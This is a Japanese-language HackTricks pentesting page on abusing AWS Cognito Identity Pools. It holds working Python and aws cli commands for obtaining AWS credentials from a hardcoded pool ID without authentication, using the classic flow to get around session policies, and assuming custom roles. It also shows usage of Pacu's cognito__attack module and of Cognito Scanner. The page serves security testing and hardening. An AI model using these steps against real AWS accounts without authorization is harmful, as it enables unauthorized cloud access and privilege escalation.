# Cognito Identity Pools

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**PEASSの最新バージョンにアクセスしたい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をご覧ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つける、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有する**ために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。

</details>

## 基本情報

Identity Poolを使用すると、ユーザーはAmazon S3やDynamoDBなどのAWSサービスにアクセスするための**一時的なAWS認証情報を取得**できます。Identity Poolは、以下のIdentity Providerを使用してユーザーを認証するために使用できる匿名ゲストユーザーとしてのサポートを提供します。

* Amazon Cognitoユーザープール
* Facebook、Google、Amazonでのソーシャルサインイン、およびAppleでのサインイン
* OpenID Connect（OIDC）プロバイダー
* SAML Identityプロバイダー
* 開発者認証済みのID

### Cognito Sync

Identity Poolセッションを生成するためには、まず**Identity IDを生成**する必要があります。このIdentity IDは、そのユーザーのセッションの**識別子**です。これらの識別子は、最大20のデータセットを持つことができ、1MBのキーバリューペアを格納することができます。

これは、ユーザーの情報を保持するのに**便利です**（常に同じIdentity IDを使用するユーザー）。

さらに、サービス**cognito-sync**は、この情報を**管理および同期**するためのサービスです（データセット内での情報の送信、ストリームおよびSNSメッセージの送信など）。

### ペンテストと列挙のためのPacuモジュール

AWSのエクスプロイトフレームワークである[Pacu](https://github.com/RhinoSecurityLabs/pacu)には、現在、アカウント内のすべてのCognitoアセットの列挙と弱い設定のフラグ付け、アクセス制御に使用されるユーザーアトリビュートなどの自動化された"cognito__enum"および"cognito__attack"モジュールが含まれています。また、変更可能なカスタム属性に基づいたユーザー作成（MFAサポートを含む）および特権エスカレーション、使用可能なIdentity Pool認証情報、IDトークン内のアサーティブルロールなども自動化されています。

モジュールの機能の詳細については、[ブログ記事](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2)のパート2を参照してください。インストール手順については、メインの[Pacu](https://github.com/RhinoSecurityLabs/pacu)ページを参照してください。

### 使用方法

指定されたIdentity Poolとユーザープールクライアントに対してユーザー作成とすべての特権エスカレーションベクトルを試すためのcognito__attackの使用例：
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
現在のAWSアカウントで表示されるすべてのユーザープール、ユーザープールクライアント、アイデンティティプール、ユーザーなどを収集するためのcognito__enumの使用例です。

```bash
cognito__enum --all
```

このコマンドは、AWSアカウント内のすべてのCognitoリソースを列挙します。これには、ユーザープール、ユーザープールクライアント、アイデンティティプール、ユーザーなどが含まれます。
```bash
Pacu (new:test) > run cognito__enum
```
### ペンテストツール

[Cognito Scanner](https://github.com/padok-team/cognito-scanner)は、Cognitoに対して不要なアカウント作成やアイデンティティプールのエスカレーションなど、さまざまな攻撃を実装したPythonのCLIツールです。

#### インストール
```bash
$ pip install cognito-scanner
```
#### 使用法
```bash
$ cognito-scanner --help
```
詳細については、https://github.com/padok-team/cognito-scanner を参照してください。

## IAMロールへのアクセス

### 認証されていない場合

Cognitoアプリで**AWSの資格情報を取得**するために、攻撃者が知る必要があるのは**Identity Pool ID**だけであり、この**IDはWeb/Mobileアプリケーションにハードコード**されている必要があります。IDは次のような形式です：`eu-west-1:098e5341-8364-038d-16de-1865e435da3b`（ブルートフォース攻撃はできません）。

{% hint style="success" %}
デフォルトでは、**IAM Cognitoの未認証ロールは** `<Identity Pool name>Unauth_Role` と呼ばれます。
{% endhint %}

Identity Pools IDがハードコードされており、未認証ユーザーが許可されている場合、次のコマンドでAWSの資格情報を取得できます：
```python
import requests

region = "us-east-1"
id_pool_id = 'eu-west-1:098e5341-8364-038d-16de-1865e435da3b'
url = f'https://cognito-identity.{region}.amazonaws.com/'
headers = {"X-Amz-Target": "AWSCognitoIdentityService.GetId", "Content-Type": "application/x-amz-json-1.1"}
params = {'IdentityPoolId': id_pool_id}

r = requests.post(url, json=params, headers=headers)
json_resp = r.json()

if not "IdentityId" in json_resp:
print(f"Not valid id: {id_pool_id}")
exit

IdentityId = r.json()["IdentityId"]

params = {'IdentityId': IdentityId}

headers["X-Amz-Target"] = "AWSCognitoIdentityService.GetCredentialsForIdentity"
r = requests.post(url, json=params, headers=headers)

print(r.json())
```
または、次の **aws cli コマンド** を使用することもできます:
```bash
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign
aws cognito-identity get-credentials-for-identity --identity-id <identity_id> --no-sign
```
{% hint style="warning" %}
デフォルトでは、未認証のCognitoユーザーは、ポリシーを介して割り当てられた場合でも、**いかなる権限も持つことはできません**。以下のセクションを確認してください。
{% endhint %}

### 強化認証フローと基本認証フロー

前のセクションでは、**デフォルトの強化認証フロー**に従いました。このフローでは、生成されたIAMロールセッションに**制限のある**[**セッションポリシー**](../../aws-basic-information/#session-policies)が設定されます。このポリシーでは、セッションが[**このリストのサービスを使用することしか許可されません**](https://docs.aws.amazon.com/cognito/latest/developerguide/iam-roles.html#access-policies-scope-down-services)（ロールが他のサービスにアクセスできる場合でも）。

ただし、**Identityプールに「基本（クラシック）フロー」が有効になっている場合**、ユーザーはそのフローを使用してセッションを取得し、**制限のあるセッションポリシーを持たない**セッションを取得することができます。

{% code overflow="wrap" %}
```bash
# Get auth ID
aws cognito-identity get-id --identity-pool-id <identity_pool_id> --no-sign

# Get login token
aws cognito-identity get-open-id-token --identity-id <identity_id> --no-sign

# Use login token to get IAM session creds
## If you don't know the role_arn use the previous enhanced flow to get it
aws sts assume-role-with-web-identity --role-arn "arn:aws:iam::<acc_id>:role/<role_name>" --role-session-name sessionname --web-identity-token <token> --no-sign
```
{% endcode %}

{% hint style="warning" %}
この**エラー**が表示される場合は、**基本フローが有効になっていない（デフォルト）**ためです。

`An error occurred (InvalidParameterException) when calling the GetOpenIdToken operation: Basic (classic) flow is not enabled, please use enhanced flow.`
{% endhint %}

IAMの資格情報を持っている場合、[どのアクセス権限を持っているか](../../#whoami)を確認し、[特権を昇格させる](../../aws-privilege-escalation/)ことを試してください。

### 認証済み

{% hint style="info" %}
**認証済みのユーザー**はおそらく**異なる権限**が与えられる可能性があるため、**アプリ内でサインアップ**できる場合は、それを試して新しい資格情報を取得してください。
{% endhint %}

また、**Identity Pool**にアクセスする**認証済みユーザー向けのロール**も利用可能です。

これには**アイデンティティプロバイダ**へのアクセスが必要です。もし**Cognitoユーザープール**がアイデンティティプロバイダである場合、デフォルトの動作を悪用して**新しいユーザーを作成**することができるかもしれません。

{% hint style="success" %}
**IAM Cognito認証済みロールはデフォルトで** `Cognito_<Identity Pool名>Auth_Role` **と呼ばれます。**
{% endhint %}

とにかく、**以下の例**では、すでに**Identity Poolにアクセスするために使用されるCognitoユーザープール**にログインしていることを前提としています（他のタイプのアイデンティティプロバイダも設定されている可能性があることを忘れないでください）。

<pre class="language-bash"><code class="lang-bash">aws cognito-identity get-id \
--identity-pool-id &#x3C;identity_pool_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>

# 前のコマンドのレスポンスからidentity_idを取得する
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
--logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>


# IdTokenには、ユーザープールグループによってユーザーがアクセスできるロールが含まれています
# 特定のロールに対して資格情報を取得するために --custom-role-arn を使用します
aws cognito-identity get-credentials-for-identity \
--identity-id &#x3C;identity_id> \
<strong>    --custom-role-arn &#x3C;role_arn> \
</strong>    --logins cognito-idp.&#x3C;region>.amazonaws.com/&#x3C;YOUR_USER_POOL_ID>=&#x3C;ID_TOKEN>
</code></pre>

{% hint style="warning" %}
ユーザーがログインしているアイデンティティプロバイダやユーザーごとに**異なるIAMロールを設定することが可能**です（クレームを使用）。したがって、同じまたは異なるプロバイダを介して異なるユーザーにアクセスできる場合は、それらすべてのIAMロールにログインしてアクセスすることができるかもしれません。
{% endhint %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksで会社を宣伝**したい場合や、**PEASSの最新バージョンを入手**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をご確認ください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしましょう🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **HackTricks**と**HackTricks Cloud**のgithubリポジトリに**PRを提出**することで、あなたのハッキングトリックを共有してください。

</details>
